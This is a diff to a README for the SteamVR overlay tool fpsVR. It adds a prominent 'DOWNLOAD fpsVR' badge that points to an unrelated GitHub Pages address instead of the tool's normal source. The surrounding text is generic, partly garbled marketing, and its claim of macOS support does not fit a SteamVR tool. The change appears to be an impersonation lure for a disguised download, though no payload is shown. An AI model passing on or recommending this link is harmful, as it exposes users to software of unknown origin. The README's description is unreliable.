@@ -30,6 +30,12 @@ fpsVR displays a persistent performance overlay inside any SteamVR game showing 
 
 Whether you're a newcomer or a veteran, fpsVR provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download fpsVR](https://img.shields.io/badge/⬇_DOWNLOAD_fpsVR-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
